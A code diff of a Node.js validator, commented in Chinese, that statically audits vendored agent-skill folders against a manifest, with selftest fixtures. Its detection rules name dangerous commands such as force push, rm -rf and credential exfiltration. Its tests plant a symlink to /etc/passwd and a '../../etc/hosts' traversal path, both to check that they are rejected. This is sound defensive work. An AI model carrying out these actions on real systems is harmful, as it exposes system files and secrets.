@@ -7,15 +7,20 @@
  *   - AGENTS.md 第 6/6A 节              上游只读 / 不可逆动作须人工确认硬红线
  *   - vendor/agent-skills/mattpocock/manifest.json  锁定来源 commit + 文件指纹 + entry/依赖关系
  *
+ * 多 vendor：VENDOR_PROFILES 显式注册 allowlist（不全局放宽任意 license / 脚本类型）。
+ *   - mattpocock：strict 原样保留（MIT / LICENSE / 固定 4 entry / 仅 .md+.yaml / 依赖纪律 exposed:false+pureDoc）；
+ *   - oil-oil：显式注册 Apache-2.0 / LICENSE.txt / 单 entry；.json=静态测试数据（须合法 JSON）、
+ *     .html=静态文档模板（无远程 script src、无 fetch/XHR/eval/new Function/document.write/动态 import）。
  * 本脚本做什么（纯 Node 内置、只读、离线、确定性、幂等）：
- *   1. manifest schema / source.commit 精确 40-hex / license=MIT 且 LICENSE 指纹吻合；
- *   2. entrySkillIds 恰好 4 个，且与 skills[].kind==="entry" 一致；
- *   3. 只允许 manifest 显式声明的 pureDocumentation + exposed:false 依赖（当前：grilling）；
- *   4. vendored 树与 manifest 白名单逐文件对齐：无额外 / 无缺失 / 无 symlink；
- *   5. 每个文件 sha256 + bytes 与 manifest 逐位相等；
- *   6. 只允许 .md / .yaml / LICENSE / manifest.json 纯文本；禁脚本 / 二进制 / shebang / +x；
+ *   1. manifest schema / source.commit 精确 40-hex / license.spdx 与 license.file 须等于该 profile 注册值；
+ *   2. entrySkillIds 集合须精确等于 profile.expectedEntryIds，且与 skills[].kind==="entry" 一致（entry 注入拒）；
+ *   3. 依赖纪律（mattpocock）：只允许 manifest 显式声明的 pureDocumentation + exposed:false 依赖；
+ *   4. vendored 树与 manifest 白名单逐文件对齐：无额外 / 无缺失 / 无 symlink / 无路径穿越（..、绝对路径、反斜杠）；
+ *   5. 每个文件 sha256 + bytes 与 manifest 逐位相等（篡改/漂移/缺文件均 FAIL）；
+ *   6. 扩展名/根文件按 profile 白名单；禁脚本 / 二进制 / shebang / +x；非注册同级目录仅 SKIPPED_UNREGISTERED 留痕；
  *   7. 每个 SKILL.md 有 YAML frontmatter（name+description），且 name === skill id === 目录名；
- *   8. Markdown 内相对文件引用必须：vendored 内存在，或在 manifest excludedArtifacts/riskList/note 中声明为外部；
+ *   8. Markdown 内相对文件引用必须：vendored 内存在（按文件目录与 skill 根双基准解析），或在 manifest
+ *      excludedArtifacts/riskList/note/externalProjectReferences 中声明为外部；
  *   9. 政策优先字段（projectRulesPrecedence / noInstallerRun / noHomeOrGlobalWrites）为 true；
  *  10. 危险指令静态分类 F0/F1/F2：真·可执行 force push / sudo / rm -rf / home 写 / 凭据外泄 = F1(FAIL)，
  *      教学反例 / 否定式警示 / env 读取 / riskList 已声明 = F0（不算缺陷，仅记录分类）。
@@ -42,13 +47,36 @@ import { tmpdir } from 'node:os'
 // --- 路径：scripts/ 上三级 = 仓库根（packages/dsh-pm-tool/scripts -> pm-tool）---
 const here = dirname(fileURLToPath(import.meta.url))
 const REPO = join(here, '..', '..', '..')
-const VENDOR_DIR = join(REPO, 'vendor', 'agent-skills', 'mattpocock')
 
 const EXPECTED_SCHEMA_VERSION = 3                  // 最终契约：仅 schema3
-const EXPECTED_ENTRY_IDS = ['grill-me', 'tdd', 'code-review', 'diagnosing-bugs'] // 政策固定的首批 4 个 entry
 const COMMIT_RE = /^[0-9a-f]{40}$/           // 精确全量 commit SHA，禁止 branch/tag 浮动
-const ALLOWED_EXT = new Set(['.md', '.yaml', '.yml'])
-const ALLOWED_ROOT_FILES = new Set(['LICENSE'])   // 无扩展名白名单（base name 精确）
+
+// --- 显式 vendor profile 注册表（只此两处放行；禁止全局放宽任意 license / 脚本类型）---
+// mattpocock：既有 strict 规则原样保留（MIT / LICENSE / 固定 4 entry / 仅 md+yaml）。
+// oil-oil：显式注册 Apache-2.0 / LICENSE.txt / 单 entry；.json=静态测试数据、.html=静态文档模板，
+//          仍须逐文件锁在 manifest 指定清单内，且 html 过静态门（无远程脚本/无网络执行 API）。
+export const VENDOR_PROFILES = {
+  'mattpocock': {
+    licenseSpdx: 'MIT',
+    licenseFile: 'LICENSE',
+    expectedEntryIds: ['grill-me', 'tdd', 'code-review', 'diagnosing-bugs'],
+    allowedExt: new Set(['.md', '.yaml', '.yml']),
+    allowedRootBase: new Set(['LICENSE']),
+    dependencyDiscipline: true,
+    allowJson: false,
+    allowHtml: false,
+  },
+  'oil-oil': {
+    licenseSpdx: 'Apache-2.0',
+    licenseFile: 'LICENSE.txt',
+    expectedEntryIds: ['oiloil-ui-ux-guide'],
+    allowedExt: new Set(['.md', '.json', '.html']),
+    allowedRootBase: new Set(['LICENSE.txt']),
+    dependencyDiscipline: false,
+    allowJson: true,
+    allowHtml: true,
+  },
+}
 
 // 危险指令规则（仅匹配"疑似危险"片段，再经 classifyHit 归类 F0/F1/F2）
 // 注意：刻意要求命令上下文，避免把英文 "forces"、"keyword" 等词误伤为危险指令。
@@ -138,10 +166,63 @@ function classifyHit({ ruleId, line, fileRel, declaredRiskFiles }) {
   return 'F1'
 }
 
+/**
+ * 静态 HTML 门（仅 profile.allowHtml 的 vendor 调用）：只做正则静态扫描，绝不执行。
+ * FAIL：远程 <script src=http(s)>、网络执行 API（fetch/XHR/eval/new Function/document.write/动态 import）。
+ * 本地相对 <script src>：须在磁盘存在，或在 manifest excluded/risk/note 中显式声明（如 agent 生成的 design-config.js）。
+ * 被动 http(s) URL（w3.org 命名空间、preconnect 提示）只留痕 note，不算缺陷。
+ */
+function scanStaticHtml(rel, text, { add, notes, onDiskSet, declaredBlob }) {
+  // 远程脚本 src（外部可执行载荷）
+  if (/<script\b[^>]*\bsrc\s*=\s*["']https?:\/\//i.test(text)) {
+    add('HTML_REMOTE_SCRIPT', `${rel}：含远程 <script src=http(s)>（外部可执行脚本），静态文档模板禁止`)
+  }
+  // 可执行 / 网络 API 载荷
+  const execHits = [
+    ['fetch', /\bfetch\s*\(/i],
+    ['XMLHttpRequest', /\bXMLHttpRequest\b/],
+    ['eval', /\beval\s*\(/],
+    ['new Function', /\bnew\s+Function\s*\(/],
+    ['document.write', /\bdocument\.write\s*\(/],
+    ['dynamic import', /\bimport\s*\(/],
+  ]
+  for (const [label, re] of execHits) {
+    if (re.test(text)) add('HTML_EXEC', `${rel}：含可执行/网络载荷 ${label}，静态文档模板禁止（不执行 vendored html）`)
+  }
+  // 本地相对 script src：磁盘存在或 manifest 显式声明
+  const srcRe = /<script\b[^>]*\bsrc\s*=\s*["']([^"']+)["']/gi
+  let m
+  while ((m = srcRe.exec(text))) {
+    const target = m[1]
+    if (/^https?:\/\//i.test(target)) continue   // 远程已由 HTML_REMOTE_SCRIPT 处理
+    const resolved = normalize(join(dirname(join('/', rel)), target)).split(sep).join('/').replace(/^\/+/, '')
+    if (onDiskSet.has(resolved)) continue
+    const declared = declaredBlob && (declaredBlob.includes(target) || declaredBlob.includes(basename(target)))
+    if (declared) {
+      notes.push(`[HTML-LOCAL-SRC] ${rel}: 本地脚本 "${target}" 非 vendored，已在 manifest 声明（agent 生成/会话临时）`)
+    } else {
+      add('REF_UNRESOLVED', `${rel}: 本地脚本 src "${target}" 既不在 vendored 树，也未在 manifest 声明`)
+    }
+  }
+  // 被动 URL 留痕（不阻断，按 URL 去重，避免同一命名空间重复刷屏）
+  const seenUrls = new Set()
+  const urlRe = /https?:\/\/[^\s"'<>)]+/gi
+  let u
+  while ((u = urlRe.exec(text))) {
+    const url = u[0].slice(0, 80)
+    if (seenUrls.has(url)) continue
+    seenUrls.add(url)
+    notes.push(`[HTML-URL-PASSIVE] ${rel}: 被动引用 ${url}（静态文本/命名空间/preconnect，非执行）`)
+  }
+}
+
 // ---------------------------------------------------------------------------
 // 核心校验：对一个 vendor 根做只读静态检查，返回结构化结果（不直接 process.exit）
 // ---------------------------------------------------------------------------
-export function checkVendorRoot(vendorRoot, { expectedEntryIds = EXPECTED_ENTRY_IDS } = {}) {
+export function checkVendorRoot(vendorRoot, profile) {
+  if (!profile || !profile.licenseSpdx || !Array.isArray(profile.expectedEntryIds)) {
+    return { ok: false, errors: ['[PROFILE] 缺少合法 vendor profile（licenseSpdx / expectedEntryIds）'], notes: [], commit: null, fileCount: 0 }
+  }
   const errors = []   // 阻断
   const notes = []    // 信息/分类留痕
   const add = (code, msg) => errors.push(`[${code}] ${msg}`)
@@ -172,11 +253,15 @@ export function checkVendorRoot(vendorRoot, { expectedEntryIds = EXPECTED_ENTRY_
   if (!src.fetchedAtUtc) add('SOURCE_FETCHED', 'source.fetchedAtUtc 缺失')
   const commit = typeof src.commit === 'string' && COMMIT_RE.test(src.commit) ? src.commit : null
 
-  // --- 3. license：MIT 且 LICENSE 文件存在 ---
+  // --- 3. license：按 profile 显式登记的 spdx 与文件名（不全局接受任意 license）---
   const lic = manifest.license || {}
-  if (lic.spdx !== 'MIT') add('LICENSE_SPDX', `license.spdx 必须为 OSI 宽松许可（MIT），实际=${JSON.stringify(lic.spdx)}；禁止 GPL/AGPL/LGPL copyleft`)
+  if (lic.spdx !== profile.licenseSpdx) {
+    add('LICENSE_SPDX', `license.spdx 必须为注册 profile 指定的 ${JSON.stringify(profile.licenseSpdx)}，实际=${JSON.stringify(lic.spdx)}；禁止 GPL/AGPL/LGPL copyleft，也不得冒充其他宽松许可`)
+  }
   const licFile = lic.file ?? lic.vendoredAt
-  if (licFile !== 'LICENSE') add('LICENSE_FILE', `license.file 必须为 "LICENSE"，实际=${JSON.stringify(licFile)}`)
+  if (licFile !== profile.licenseFile) {
+    add('LICENSE_FILE', `license.file 必须为 ${JSON.stringify(profile.licenseFile)}（profile=${Object.keys(VENDOR_PROFILES).join('/')}），实际=${JSON.stringify(licFile)}`)
+  }
 
   // --- 4. 政策优先字段 ---
   const pol = manifest.policy || {}
@@ -187,11 +272,30 @@ export function checkVendorRoot(vendorRoot, { expectedEntryIds = EXPECTED_ENTRY_
   if (!prp.statement) add('POLICY', 'projectRulesPriority.statement 缺失')
   if (!prp.conflictResolution) add('POLICY', 'projectRulesPriority.conflictResolution 缺失')
 
-  // --- 5. 汇总 manifest 声明的文件清单（rootFiles + 各 skill vendoredFiles）---
+  // --- 5. 汇总 manifest 声明的文件清单（rootFiles + 各 skill files[]），并做路径安全校验 ---
   const declaredFiles = new Map()   // rel(posix) -> { sha256, bytes }
+  /** 路径安全：拒绝绝对路径、反斜杠、.. 穿越；规范化后必须仍落在 vendor 根内。 */
+  const safeDeclaredPath = (rel) => {
+    if (typeof rel !== 'string' || !rel) return false
+    if (rel.startsWith('/') || rel.includes('\\') || /^[A-Za-z]:/.test(rel)) return false
+    const segs = normalize(rel).split(sep).join('/').split('/')
+    if (segs.includes('..')) return false
+    const resolved = resolve(vendorRoot, normalize(rel))
+    const rootResolved = resolve(vendorRoot)
+    const relOut = relative(rootResolved, resolved)
+    if (relOut.startsWith('..') || resolve(rootResolved, relOut) !== resolved) return false
+    return true
+  }
+  const registerDeclared = (rel, entry) => {
+    if (!safeDeclaredPath(rel)) {
+      add('PATH_TRAVERSAL', `manifest 声明路径越界/穿越：${JSON.stringify(rel)}（拒绝绝对路径、反斜杠、.. 段）`)
+      return
+    }
+    declaredFiles.set(rel, { sha256: entry?.sha256, bytes: entry?.bytes })
+  }
   const rootFiles = Array.isArray(manifest.rootFiles) ? manifest.rootFiles : []
   for (const rf of rootFiles) {
-    if (rf && typeof rf.path === 'string') declaredFiles.set(rf.path, { sha256: rf.sha256, bytes: rf.bytes })
+    if (rf && typeof rf.path === 'string') registerDeclared(rf.path, rf)
   }
   const skills = Array.isArray(manifest.skills) ? manifest.skills : []
   // 最终 schema3 仅认 s.files 字段（不回退 vendoredFiles，避免旧格式漂移通过）
@@ -201,13 +305,14 @@ export function checkVendorRoot(vendorRoot, { expectedEntryIds = EXPECTED_ENTRY_
   }
   for (const s of skills) {
     for (const vf of skillFiles(s)) {
-      if (vf && typeof vf.path === 'string') declaredFiles.set(vf.path, { sha256: vf.sha256, bytes: vf.bytes })
+      if (vf && typeof vf.path === 'string') registerDeclared(vf.path, vf)
     }
   }
 
   // --- 6. entrySkillIds 集合精确等于政策固定的四个（O-D：非仅计数=4），且与 kind=entry 一致 ---
   const entryIds = Array.isArray(manifest.entrySkillIds) ? manifest.entrySkillIds : []
   if (new Set(entryIds).size !== entryIds.length) add('ENTRY_DUP', 'entrySkillIds 存在重复 id')
+  const expectedEntryIds = profile.expectedEntryIds
   const expectedSet = new Set(expectedEntryIds)
   const missingEntries = expectedEntryIds.filter((id) => !entryIds.includes(id))
   const extraEntries = entryIds.filter((id) => !expectedSet.has(id))
@@ -229,16 +334,20 @@ export function checkVendorRoot(vendorRoot, { expectedEntryIds = EXPECTED_ENTRY_
   for (const d of declaredDeps) {
     if (!d || typeof d.dependencySkillId !== 'string') continue
     depDeclared.add(d.dependencySkillId)
-    if (d.exposed !== false) add('DEP_EXPOSED', `依赖 "${d.dependencySkillId}" 必须 exposed:false（不得作为公开 entry）`)
-    if (d.pureDocumentation !== true) add('DEP_PUREDOC', `依赖 "${d.dependencySkillId}" 必须 pureDocumentation:true（纯文档，无可执行代码）`)
-    if (typeof d.entrySkillId !== 'string' || !skillById.has(d.entrySkillId)) add('DEP_REL', `依赖 "${d.dependencySkillId}" 缺少有效的 entrySkillId 归属关系`)
+    // 依赖纪律（exposed:false / pureDocumentation / 归属）仅对开启该纪律的 profile 强制；
+    // oil-oil 单 entry 无依赖，不套用 mattpocock 的依赖字段要求。
+    if (profile.dependencyDiscipline) {
+      if (d.exposed !== false) add('DEP_EXPOSED', `依赖 "${d.dependencySkillId}" 必须 exposed:false（不得作为公开 entry）`)
+      if (d.pureDocumentation !== true) add('DEP_PUREDOC', `依赖 "${d.dependencySkillId}" 必须 pureDocumentation:true（纯文档，无可执行代码）`)
+      if (typeof d.entrySkillId !== 'string' || !skillById.has(d.entrySkillId)) add('DEP_REL', `依赖 "${d.dependencySkillId}" 缺少有效的 entrySkillId 归属关系`)
+    }
   }
   for (const s of skills) {
     if (entryIds.includes(s.id)) continue           // entry，跳过
-    // 非 entry 的 skill 必须是"已声明依赖"，且 kind=dependency + exposed:false
+    // 非 entry 的 skill 必须是"已声明依赖"（未声明的额外 skill = 越界，所有 profile 通用）
     if (!depDeclared.has(s.id)) {
       add('DEP_UNDECLARED', `skills["${s.id}"] 既不是 entry 也未在 declaredDependencies 中声明（未声明的额外 skill = 越界）`)
-    } else {
+    } else if (profile.dependencyDiscipline) {
       if (s.kind !== 'dependency') add('DEP_KIND', `依赖 skills["${s.id}"].kind 必须为 "dependency"`)
       if (s.exposed !== false) add('DEP_EXPOSED', `依赖 skills["${s.id}"].exposed 必须为 false`)
     }
@@ -272,13 +381,38 @@ export function checkVendorRoot(vendorRoot, { expectedEntryIds = EXPECTED_ENTRY_
     const bytes = buf.length
     const hash = sha256Of(buf)
 
-    // 扩展名 / base 白名单
+    // 扩展名 / base 白名单（按 profile；不全局放行脚本/二进制）
     const base = basename(rel)
     const ext = extname(rel).toLowerCase()
-    const allowedExt = ALLOWED_EXT.has(ext)
-    const allowedBase = rel === 'LICENSE' || ALLOWED_ROOT_FILES.has(base)
+    const allowedExt = profile.allowedExt.has(ext)
+    const allowedBase = profile.allowedRootBase.has(base)
     if (!allowedExt && !allowedBase) {
-      add('FORBIDDEN_FILE_TYPE', `${rel}：扩展名/文件类型不允许（仅 .md/.yaml/LICENSE 纯文本；禁止 .sh/.py/.js/.mjs/package.json/二进制）`)
+      add('FORBIDDEN_FILE_TYPE', `${rel}：扩展名/文件类型不允许（本 profile 仅 ${[...profile.allowedExt].join('/')} + 根 ${[...profile.allowedRootBase].join('/')}；禁止 .sh/.py/.js/.mjs/package.json/二进制）`)
+    }
+
+    // .json 仅在 profile 显式 allowJson 时放行，且必须是合法静态数据（不执行）
+    if (ext === '.json') {
+      if (!profile.allowJson) {
+        add('FORBIDDEN_FILE_TYPE', `${rel}：本 profile 不放行 .json（仅锁 manifest 指定的静态数据文件）`)
+      } else {
+        try { JSON.parse(buf.toString('utf8')) }
+        catch (e) { add('JSON_MALFORMED', `${rel}：.json 不是合法静态 JSON（${e.message}）`) }
+      }
+    }
+
+    // .html 仅在 profile 显式 allowHtml 时放行，且必须是静态文档模板（无远程脚本/无网络执行 API）
+    if (ext === '.html') {
+      if (!profile.allowHtml) {
+        add('FORBIDDEN_FILE_TYPE', `${rel}：本 profile 不放行 .html`)
+      } else {
+        const declaredBlob = JSON.stringify({
+          excludedArtifacts: manifest.excludedArtifacts,
+          externalProjectReferences: manifest.externalProjectReferences,
+          riskList: manifest.riskList,
+          skills: skills.map((s) => ({ note: s.note, reviewNotes: s.reviewNotes, riskNotes: s.riskNotes, externalProjectReferences: s.externalProjectReferences })),
+        })
+        scanStaticHtml(rel, buf.toString('utf8'), { add, notes, onDiskSet, declaredBlob })
+      }
     }
 
     // 可执行位
@@ -336,10 +470,16 @@ export function checkVendorRoot(vendorRoot, { expectedEntryIds = EXPECTED_ENTRY_
   for (const f of diskFiles.filter((x) => extname(x.rel).toLowerCase() === '.md')) {
     const text = readFileSync(f.abs, 'utf8')
     const dirOfFile = dirname(join(vendorRoot, f.rel))
+    // skill 根（skills/<id>/）作为第二解析基准：上游文档常以 references/xxx.md 从 skill 根书写，
+    // 而非相对当前 references/ 文件，避免 references/references/ 双重前缀误判未解析。
+    const skillRoot = dirname(dirname(join(vendorRoot, f.rel)))
     for (const ref of extractRelativeRefs(text)) {
-      const resolved = normalize(join(dirOfFile, ref))
-      const relResolved = relative(vendorRoot, resolved).split(sep).join('/')
-      if (onDiskSet.has(relResolved)) continue          // vendored 内存在 → OK
+      const candidates = [dirOfFile, skillRoot].map((base) => {
+        const resolved = normalize(join(base, ref))
+        return relative(vendorRoot, resolved).split(sep).join('/')
+      })
+      if (candidates.some((relResolved) => onDiskSet.has(relResolved))) continue   // vendored 内存在 → OK
+      const relResolved = candidates[0]
       // 不在 vendor 内：必须在 manifest 显式声明（不做"裸 .md 自动放行"，保持严格）
       const base = basename(ref)
       const declaredExternal =
@@ -396,6 +536,43 @@ export function checkVendorRoot(vendorRoot, { expectedEntryIds = EXPECTED_ENTRY_
 }
 
 // ---------------------------------------------------------------------------
+// 多 vendor 扫描：遍历 vendor/agent-skills 下一级目录，只认显式注册 profile；
+// 未注册目录（夹带/未知 vendor）→ UNKNOWN_VENDOR 拒；注册但缺失 → MISSING_VENDOR 拒。
+// ---------------------------------------------------------------------------
+export function scanVendorRoots(agentSkillsDir) {
+  const errors = []
+  const notes = []
+  const perVendor = []
+  let entries = []
+  try {
+    entries = readdirSync(agentSkillsDir, { withFileTypes: true })
+      .filter((e) => e.isDirectory())
+      .map((e) => e.name)
+  } catch {
+    return { ok: false, errors: [`[VENDOR_DIR] 读不到 ${agentSkillsDir}`], notes: [], perVendor: [] }
+  }
+  const onDiskDirs = new Set(entries)
+  for (const [vendorName, profile] of Object.entries(VENDOR_PROFILES)) {
+    if (!onDiskDirs.has(vendorName)) {
+      errors.push(`[MISSING_VENDOR] 注册 profile "${vendorName}" 目录缺失：${join(agentSkillsDir, vendorName)}`)
+      continue
+    }
+    const r = checkVendorRoot(join(agentSkillsDir, vendorName), profile)
+    perVendor.push({ vendorName, ...r })
+    errors.push(...r.errors.map((e) => `[${vendorName}] ${e}`))
+    notes.push(...r.notes.map((n) => `[${vendorName}] ${n}`))
+  }
+  // 未注册的同级目录：本静态门只审计显式注册 profile，不越权审计/也不据此 FAIL；
+  // 记 SKIPPED_UNREGISTERED 留痕（夹带检测由各注册树内的 EXTRA_FILE/MISSING_FILE 负责）。
+  for (const name of entries) {
+    if (!VENDOR_PROFILES[name]) {
+      notes.push(`[SKIPPED_UNREGISTERED] "${name}" 不在本校验器显式 profile allowlist，跳过（不由本门审计；不得在该树内夹带注册文件）`)
+    }
+  }
+  return { ok: errors.length === 0, errors, notes, perVendor }
+}
+
+// ---------------------------------------------------------------------------
 // selftest：在系统临时目录建负例夹具，验证本校验器能正确拒绝篡改
 // ---------------------------------------------------------------------------
 function buildFixtureDir() {
@@ -417,8 +594,37 @@ function writeTree(dir, relToContent) {
   }
 }
 
-/** 由"文件内容"反推 manifest 指纹，生成一份合法 manifest。 */
-function makeManifest({ files, entries, deps }) {
+/** selftest 夹具用 MIT strict profile（等价 mattpocock 规则，但 entry 集合参数化）。 */
+function FIXTURE_MIT_PROFILE(entries) {
+  return {
+    licenseSpdx: 'MIT',
+    licenseFile: 'LICENSE',
+    expectedEntryIds: entries,
+    allowedExt: new Set(['.md', '.yaml', '.yml']),
+    allowedRootBase: new Set(['LICENSE']),
+    dependencyDiscipline: true,
+    allowJson: false,
+    allowHtml: false,
+  }
+}
+
+/** selftest 夹具用 oil 风格 profile（Apache-2.0 / LICENSE.txt / 单 entry / json+html）。 */
+function FIXTURE_OIL_PROFILE() {
+  return {
+    licenseSpdx: 'Apache-2.0',
+    licenseFile: 'LICENSE.txt',
+    expectedEntryIds: ['oiloil-ui-ux-guide'],
+    allowedExt: new Set(['.md', '.json', '.html']),
+    allowedRootBase: new Set(['LICENSE.txt']),
+    dependencyDiscipline: false,
+    allowJson: true,
+    allowHtml: true,
+  }
+}
+
+/** 由"文件内容"反推 manifest 指纹，生成一份合法 manifest（license 取自 profile）。 */
+function makeManifest({ files, entries, deps, profile }) {
+  const prof = profile || FIXTURE_MIT_PROFILE(entries)
   const byRel = {}
   for (const [rel, content] of Object.entries(files)) {
     const buf = typeof content === 'string' ? Buffer.from(content, 'utf8') : content
@@ -446,10 +652,14 @@ function makeManifest({ files, entries, deps }) {
     declaredDependencies: (deps || []).map((d) => ({
       entrySkillId: d.of, dependencySkillId: d.id, exposed: false, pureDocumentation: true, reason: 'fixture dep',
     })),
-    license: { spdx: 'MIT', file: 'LICENSE' },
+    license: { spdx: prof.licenseSpdx, file: prof.licenseFile },
     policy: { projectRulesPrecedence: true, noInstallerRun: true, noHomeOrGlobalWrites: true },
     projectRulesPriority: { statement: 'project rules win', conflictResolution: 'project wins' },
-    skills, rootFiles, excludedArtifacts: [], riskList: [],
+    skills, rootFiles,
+    excludedArtifacts: prof.allowHtml
+      ? ['design-config.js — agent-generated local preview config, never vendored']
+      : [],
+    riskList: [],
     integrity: { vendoredFileCount: Object.keys(byRel).length },
   }
 }
@@ -486,7 +696,7 @@ function runSelftest() {
     writeTree(dir, { 'manifest.json': JSON.stringify(makeManifest({
       files, entries: ['a', 'b', 'c', 'd'], deps: [{ id: 'dep', of: 'a' }],
     }), null, 2) })
-    const r = checkVendorRoot(dir, { expectedEntryIds: ['a', 'b', 'c', 'd'] })
+    const r = checkVendorRoot(dir, FIXTURE_MIT_PROFILE(['a', 'b', 'c', 'd']))
     expect('基线合法 vendor 通过', r.ok, r.errors.join(' | '))
   }
 
@@ -508,7 +718,7 @@ function runSelftest() {
     writeTree(dir, { 'manifest.json': JSON.stringify(makeManifest({ files, entries: ['a', 'b', 'c', 'd'], deps: [] }), null, 2) })
     // 事后改 a/SKILL.md 内容，使磁盘 hash != manifest
     writeTree(dir, { 'skills/a/SKILL.md': SKILL_MD('a') + '\n# tampered line\n' })
-    const r = checkVendorRoot(dir, { expectedEntryIds: ['a', 'b', 'c', 'd'] })
+    const r = checkVendorRoot(dir, FIXTURE_MIT_PROFILE(['a', 'b', 'c', 'd']))
     expect('篡改 hash 被拒', !r.ok && r.errors.some((e) => e.includes('HASH')), r.errors.join(' | '))
   }
 
@@ -526,7 +736,7 @@ function runSelftest() {
     writeTree(dir, { 'manifest.json': JSON.stringify(makeManifest({ files, entries: ['a', 'b', 'c', 'd'], deps: [] }), null, 2) })
     // 额外夹带一个未声明的 skill 文件
     writeTree(dir, { 'skills/e/SKILL.md': SKILL_MD('e') })
-    const r = checkVendorRoot(dir, { expectedEntryIds: ['a', 'b', 'c', 'd'] })
+    const r = checkVendorRoot(dir, FIXTURE_MIT_PROFILE(['a', 'b', 'c', 'd']))
     expect('额外未声明 skill 被拒', !r.ok && r.errors.some((e) => e.includes('EXTRA_FILE') || e.includes('DEP_UNDECLARED')), r.errors.join(' | '))
   }
 
@@ -544,7 +754,7 @@ function runSelftest() {
     // install.sh 若声明进 manifest 也应因 FORBIDDEN_FILE_TYPE 被拒
     writeTree(dir, files)
     writeTree(dir, { 'manifest.json': JSON.stringify(makeManifest({ files, entries: ['a', 'b', 'c', 'd'], deps: [] }), null, 2) })
-    const r = checkVendorRoot(dir, { expectedEntryIds: ['a', 'b', 'c', 'd'] })
+    const r = checkVendorRoot(dir, FIXTURE_MIT_PROFILE(['a', 'b', 'c', 'd']))
     expect('脚本文件(.sh)被拒', !r.ok && r.errors.some((e) => e.includes('FORBIDDEN_FILE_TYPE') || e.includes('SHEBANG')), r.errors.join(' | '))
   }
 
@@ -562,7 +772,7 @@ function runSelftest() {
     writeTree(dir, { 'manifest.json': JSON.stringify(makeManifest({ files, entries: ['a', 'b', 'c', 'd'], deps: [] }), null, 2) })
     // 建一个指向外部的 symlink（不写入 manifest，磁盘树出现 symlink 即 FAIL）
     writeTree(dir, { 'skills/a/link.md': { __symlink: '/etc/passwd' } })
-    const r = checkVendorRoot(dir, { expectedEntryIds: ['a', 'b', 'c', 'd'] })
+    const r = checkVendorRoot(dir, FIXTURE_MIT_PROFILE(['a', 'b', 'c', 'd']))
     expect('symlink 被拒', !r.ok && r.errors.some((e) => e.includes('SYMLINK')), r.errors.join(' | '))
   }
 
@@ -579,7 +789,7 @@ function runSelftest() {
     }
     writeTree(dir, files)
     writeTree(dir, { 'manifest.json': JSON.stringify(makeManifest({ files, entries: ['a', 'b', 'c', 'd'], deps: [] }), null, 2) })
-    const r = checkVendorRoot(dir, { expectedEntryIds: ['a', 'b', 'c', 'd'] })
+    const r = checkVendorRoot(dir, FIXTURE_MIT_PROFILE(['a', 'b', 'c', 'd']))
     expect('真·force-push 祈使指令判 F1 被拒', !r.ok && r.errors.some((e) => e.includes('DANGER_F1') && e.includes('force-push')), r.errors.join(' | '))
   }
 
@@ -596,7 +806,7 @@ function runSelftest() {
     }
     writeTree(dir, files)
     writeTree(dir, { 'manifest.json': JSON.stringify(makeManifest({ files, entries: ['a', 'b', 'c', 'd'], deps: [] }), null, 2) })
-    const r = checkVendorRoot(dir, { expectedEntryIds: ['a', 'b', 'c', 'd'] })
+    const r = checkVendorRoot(dir, FIXTURE_MIT_PROFILE(['a', 'b', 'c', 'd']))
     expect('否定式反例不误报（PASS）', r.ok, r.errors.join(' | '))
   }
 
@@ -614,8 +824,122 @@ function runSelftest() {
     const man = makeManifest({ files, entries: ['a', 'b', 'c', 'd'], deps: [] })
     man.entrySkillIds = ['a', 'b', 'c', 'zzz']   // 4 个，但集合不等于期望四个
     writeTree(dir, { 'manifest.json': JSON.stringify(man, null, 2) })
-    const r = checkVendorRoot(dir, { expectedEntryIds: ['a', 'b', 'c', 'd'] })
+    const r = checkVendorRoot(dir, FIXTURE_MIT_PROFILE(['a', 'b', 'c', 'd']))
     expect('entry 集合错误（count=4 但 id 不符）被 ENTRY_SET 拒', !r.ok && r.errors.some((e) => e.includes('ENTRY_SET')), r.errors.join(' | '))
+  }
+
+  // --- 8. oil 风格合法夹具 PASS（Apache-2.0 / LICENSE.txt / md+json+静态 html）---
+  const OIL = {
+    'LICENSE.txt': 'Apache License Version 2.0 fixture\n',
+    'skills/oiloil-ui-ux-guide/SKILL.md': SKILL_MD('oiloil-ui-ux-guide'),
+    'skills/oiloil-ui-ux-guide/evals/evals.json': '{"cases": []}',
+    'skills/oiloil-ui-ux-guide/references/preview.html':
+      '<!doctype html><html><head><link rel="preconnect" href="https://fonts.googleapis.com"></head>' +
+      '<body><p>static</p><script src="design-config.js"></script></body></html>',
+  }
+  {
+    const dir = buildFixtureDir()
+    writeTree(dir, OIL)
+    const man = makeManifest({ files: OIL, entries: ['oiloil-ui-ux-guide'], profile: FIXTURE_OIL_PROFILE() })
+    man.excludedArtifacts = ['design-config.js — agent-generated local preview config, never vendored']
+    writeTree(dir, { 'manifest.json': JSON.stringify(man, null, 2) })
+    const r = checkVendorRoot(dir, FIXTURE_OIL_PROFILE())
+    expect('oil 合法夹具（静态 html + 已声明本地 config）PASS', r.ok, r.errors.join(' | '))
+  }
+
+  // --- 9. oil license spdx 误用 MIT → LICENSE_SPDX 拒 ---
+  {
+    const dir = buildFixtureDir()
+    writeTree(dir, OIL)
+    const man = makeManifest({ files: OIL, entries: ['oiloil-ui-ux-guide'], profile: FIXTURE_OIL_PROFILE() })
+    man.license.spdx = 'MIT'
+    writeTree(dir, { 'manifest.json': JSON.stringify(man, null, 2) })
+    const r = checkVendorRoot(dir, FIXTURE_OIL_PROFILE())
+    expect('oil spdx 误用 MIT 被 LICENSE_SPDX 拒', !r.ok && r.errors.some((e) => e.includes('LICENSE_SPDX')), r.errors.join(' | '))
+  }
+
+  // --- 10. oil license.file 误用 LICENSE → LICENSE_FILE 拒 ---
+  {
+    const dir = buildFixtureDir()
+    writeTree(dir, OIL)
+    const man = makeManifest({ files: OIL, entries: ['oiloil-ui-ux-guide'], profile: FIXTURE_OIL_PROFILE() })
+    man.license.file = 'LICENSE'
+    writeTree(dir, { 'manifest.json': JSON.stringify(man, null, 2) })
+    const r = checkVendorRoot(dir, FIXTURE_OIL_PROFILE())
+    expect('oil license.file 误用 LICENSE 被 LICENSE_FILE 拒', !r.ok && r.errors.some((e) => e.includes('LICENSE_FILE')), r.errors.join(' | '))
+  }
+
+  // --- 11. 路径穿越声明 → PATH_TRAVERSAL 拒 ---
+  {
+    const dir = buildFixtureDir()
+    writeTree(dir, OIL)
+    const man = makeManifest({ files: OIL, entries: ['oiloil-ui-ux-guide'], profile: FIXTURE_OIL_PROFILE() })
+    man.rootFiles.push({ path: '../../etc/hosts', sha256: '0'.repeat(64), bytes: 11 })
